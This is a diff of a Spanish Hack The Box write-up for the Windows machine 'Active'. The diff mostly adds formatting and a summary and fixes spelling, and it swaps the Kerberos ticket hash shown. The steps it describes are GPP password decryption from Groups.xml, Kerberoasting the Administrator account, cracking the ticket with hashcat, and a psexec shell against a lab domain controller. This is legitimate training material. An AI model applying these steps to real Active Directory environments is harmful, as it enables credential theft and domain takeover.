@@ -1,20 +1,26 @@
-Hack The Box - Active
-
 # Hack The Box - Active 
 
 *Active* es una máquina *Windows* de la plataforma *Hack The Box* con un *rating* de 5 estrellas creada por *eks* & *mrb3n*.
 
+![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines_writeups/main/hackthebox/img/active.jpg)
+
+![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines_writeups/main/hackthebox/img/E5ioAGNWEAQVcYw.jpg)
+
 * * *
 
+### TL;DR
+
+En el archivo `Groups.xml` alojado en una ruta del servidor en un recurso compartido encontraremos unas credenciales encriptadas, las cuales podrán verse en texto plano gracias a la utilidad `gpp-decrypt`. Realizaremos Kerberoasting para obtener un TGS, el cual crackearemos y obtendremos las credenciales de administrador.
+
 - Escaneo
-	- nmap
+	- `nmap`
 - Enumeración
-	- smbmap
-	- smbclient
-	- `Groups.xml` - gpp-decrypt
-- Exploitación
+	- `smbmap`
+	- `smbclient`
+	- `Groups.xml` - `gpp-decrypt`
+- Explotación
 	- Kerberoasting
-	- psexec
+	- `psexec`
 
 Lo primero que haremos será añadir de la máquina y asignarle un "nombre" para que sea más fácil trabajar con ella, en este caso la he llamado active.htb.
 
@@ -94,7 +100,7 @@ smb: \> dir
 smb: \>
 ```
 
-En nuestro proceso de enumeración nos damos cuenta de que este recurso replica a `SYSVOL`. Continuando la enumeración nos topamos con un directorio llamado `Policies`, el cual contiene las *Domain Group Policies*, al igual que si estuvieramos en el recurso `SYSVOL`.
+En nuestro proceso de enumeración nos damos cuenta de que este recurso replica a `SYSVOL`. Continuando la enumeración nos topamos con un directorio llamado `Policies`, el cual contiene las *Domain Group Policies*, al igual que si estuviéramos en el recurso `SYSVOL`.
 
 ```console
 smb: \active.htb\> cd Policies
@@ -202,7 +208,7 @@ getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
 /tmp/smbmore.2qRr3M (END)
 ```
 
-En los archivos `Group.xml`, se encuentran almacenadas las credenciales (Politicas de groupo para la administración de cuentas) de usuarios.
+En los archivos `Group.xml`, se encuentran almacenadas las credenciales (Políticas de grupo para la administración de cuentas) de usuarios.
 
 Como breve resumen, contiene una contraseña cifrada en `AES-256`. Sin embargo, Microsoft en 2012, publicó la clave AES, lo que significó, que se podían desencriptar.
 
@@ -241,7 +247,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
                                                                                                                                                                      
 ┌──(root💀kali)-[/home/kali]
 └─# cat hash.txt                                                                          
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f074093a03352e78c8b2e7222683e84c$8049798114e6f3ddd0a70d2c3a6b683f72b11ffe7037c3b2492cb9ec98434f285fa80f5df5cc32c68a52a0999fee25d262c64233414e3ecd2752677192e04c1800de3ac42f4b2df128b3ab93afbc1c3e42e84c932ae7d44c68caccb70fda914cbb86e58cdf0e9e25a916c135a5ab6dc6b2c1f68330b7d0dd323d7b141e28ac96a294a76299dbcef7be8c97fb24ef8e8bb364fbf006e9922c8b26822d0d5c4dc86f585432cdccd35acdda5d6a0a4584ed62d7cf34e00d4a7e0f190ac57f8419d1d3775580f132ac6704a199e98658de45dc2e38b035a47be10093d2f97be6fb7ede70bb93170b3c9977e686b2ade460c7e1e59e32ac18e6f763bb2219f51c0d5265fd5912ac4707b895c6a632fe5a7451a390f1218a969a6e491fcab3d668cc6bc2748663891dc9531eab48e5b9357b75ade3bb979306080be856f98e3cb24814a9c0bc8c88685c9f1b19f1a73499ee42a43510a653db16e3c7a91713db071cd386d0011b8c599110a6b4a928933fab7f8ca194687eb66c65aef12c3a41123f59976787ca494f1ce0e508e74e0d22397c36a4c318215cadd552d196e89813759677f5e84e690a9da936f2c1156be6438bc4702d5c832adcc4ceaac0748c679a661f296f6297420e3556ff95a72061fc789fed76b427c620c5091dd0d82752bb36025724b72495605827781e2ec07e998319cdc7d5f1e38e30e8b014a99a409423302381f1d8d06fbf1c6572f12b2edcddaf3e7c46a1c51720bbf10d2693efdfaa71c5fa6988a8c909a32994b0a2fc1519ade83bb2dae86783301409080bca791e41f79ee58192e57f9d2afcabd76ce56ddf2242b1c6079c3ce6931eae91274adb5bf047b9fde81d295820876612a82ca56977481422263bf536a9ec29c1a8ca2aba063ee2559285eca86984deeee7a86c8c49289dbb5192a764ae216bb1e48326e6787ac6fafe168707e45cc3a31dcc6774cb06100570f3fe8f46c8f504e64ae3d274407912917b0f7d75101600c87657f43ba26c01756902aa25ee1ec777ddcd1d7c7b74440dfe858c63ca7756f54262b12e5d688931a0e39049c9c46b919070775a2db175dd107ae19dcbf32c2f5315dace8693e895d36f0fa0aae28f18ab3f94de7b3f0c94fd4f7e6aea61909c1eded7a94b8ecd9bc8d135f9fc5f389956030ed64edfb7b021ed1fa94d58da2576cf9f23f0c7585405c6f4cfdbde78a11ef13ca43bfa924b5bad6babed5073d6c769d445efdae60969ab5cad
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ec17108f0d44dd2ae92650f33e6ec1ef$e05e1d69bc38a13e45b607251effe7c10c3f5eb0556aed7e41649dc6bab22e38ad7aa46676f4caf2a19fbcb486ccec978cf0c3527b79d79b51482f47adf1bb2d1ef898634227f04316023dcc942cae7ec8a82d252ce098486231d1974c647e693d514ebba848483b66f232240361267a5e6f5978a92af55c98811f20569729fd92efca92f540587e24982c2a2de82bec41e8bd2bb7e2b8e2ae5d2ddb8a3c1c4e6a8d8b974ed4d8ccec139c9a6154e839605c5805d43241d505b3f8598b37de7361b843528888bfa0cd5840da10b2a5f40506f8e3cc8bc05f7ff310b9a48902e1ef99cd33e120fb16dc9c6c343a2a1a963a1ad73de6a4e7a4bb71d8fd66282e67d51e4a5a76ad1b3bbd03c7067bf6b154a1e4accfc0c3cf7350d32f58415587d30e832e2a270480ece0a641bee56d0728d3ae54d6b07ce291b1eec9bc6d3607c131868bd9151bc96fe5505d7d[...]
 ```
 
 Con `hashcat` en el modo 13100, podemos crackear los TGS de Kerberos.
@@ -284,7 +290,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ec17108f0d44dd2ae92650f33e6ec1ef$e05e1d69bc38a13e45b607251effe7c10c3f5eb0556aed7e41649dc6bab22e38ad7aa46676f4caf2a19fbcb486ccec978cf0c3527b79d79b51482f47adf1bb2d1ef898634227f04316023dcc942cae7ec8a82d252ce098486231d1974c647e693d514ebba848483b66f232240361267a5e6f5978a92af55c98811f20569729fd92efca92f540587e24982c2a2de82bec41e8bd2bb7e2b8e2ae5d2ddb8a3c1c4e6a8d8b974ed4d8ccec139c9a6154e839605c5805d43241d505b3f8598b37de7361b843528888bfa0cd5840da10b2a5f40506f8e3cc8bc05f7ff310b9a48902e1ef99cd33e120fb16dc9c6c343a2a1a963a1ad73de6a4e7a4bb71d8fd66282e67d51e4a5a76ad1b3bbd03c7067bf6b154a1e4accfc0c3cf7350d32f58415587d30e832e2a270480ece0a641bee56d0728d3ae54d6b07ce291b1eec9bc6d3607c131868bd9151bc96fe5505d7da71beb2dd1c0b5a3349f12b9c5b430230ee87fe25542f7d3d6b66adab87154c2884d2879c7ea49b8312a3c46609df117f98ef9d57ffb3ad37db5036644f8c84868144ed1b120412ef06a0c2a44fb58c3674eb438dbae0f165b241db999016d39dab05fb3274b49e9fa86e538e40f56ee75078d7c4505ce96b1a2880f63ce8c3a013388b717d5e160dcfa861a2ac26a9e6096038cb62f2e3d4d9c35841dad8b3d98aa462e061acb6df8c49c883a6809374713ebf98d054d11183fe844051180b67d5682d9201b04e0ad4ad1c969b3ca8ccd538555329eb8a2c8b96095c40bc0331d0ec54651f8cea1903ad23c32cfac741e9c6012a3d6a34766cdd768c2b674ad3f3693f75584846347d0262c8809e6f2c51978fbe728481c375b4ef14b503517cc930b0e10cac3545f60564394487065f16078c5da6948973417ba8be6331a028ded71b07a839cd9a526219e431493e838ecfaf6daf588872f3f86d5429f52812d478d18febc7010848cf000d31a5efe5862ef3b50dd82c91368e2ff45693c838a57f1a3bc3b9a1c24a7b2f1a93e214cbe173766f8e18c2ac2d5f461ab2325df9a9a89cd700daed284651f3b07a0b9a450dee57f01cbe628c138fc1f1e3d3c553c7e5fe932a12f34e70580fb77b60e50e0d33b10f8ea9771d6e0e6ac9c36c4c5ac655a01297da5ab94b3673cd42f2c1756b377c3a992a8b38ae3e993aef72d1c60c4cc5a0c7d3f04f3dfb58371b7d67744fb4d4cd91a7184391997a8a1c8ecaa1b291da2c1f8458d56d787954758:Ticket[...]
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ec17108f0d44dd2ae92650f33e6ec1ef$e05e1d69bc38a13e45b607251effe7c10c3f5eb0556aed7e41649dc6bab22e38ad7aa46676f4caf2a19fbcb486ccec978cf0c3527b79d79b51482f47adf1bb2d1ef898634227f04316023dcc942cae7ec8a82d252ce098486231d1974c647e693d514ebba848483b66f232240361267a5e6f5978a92af55c98811f20569729fd92efca92f540587e24982c2a2de82bec41e8bd2bb7e2b8e2ae5d2ddb8a3c1c4e6a8d8b974ed4d8ccec139c9a6154e839605c5805d43241d505b3f8598b37de7361b843528888bfa0cd5840da10b2a5f40506f8e3cc8bc05f7ff310b9a48902e1ef99cd33e120fb16dc9c6c343a2a1a963a1ad73de6a4e7a4bb71d8fd66282e67d51e4a5a76ad1b3bbd03c7067bf6b154a1e4accfc0c3cf7350d32f58415587d30e832e2a270480ece0a641bee56d0728d3ae54d6b07ce291b1eec9bc6d3607c131868bd9151bc96fe5505d7d[...]:Ticket[...]
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -322,7 +328,7 @@ SMB         10.10.10.100    445    DC               [+] Executed command
 SMB         10.10.10.100    445    DC               active\administrator
 ```
 
-Finalmente, con `psexsec` nos generamos una shell inversa.
+Finalmente, con `psexsec` generamos una shell inversa.
 
 ```console
 ┌──(root💀kali)-[/home/kali]
@@ -350,3 +356,4 @@ C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
 
 C:\Windows\system32>
 ```
+
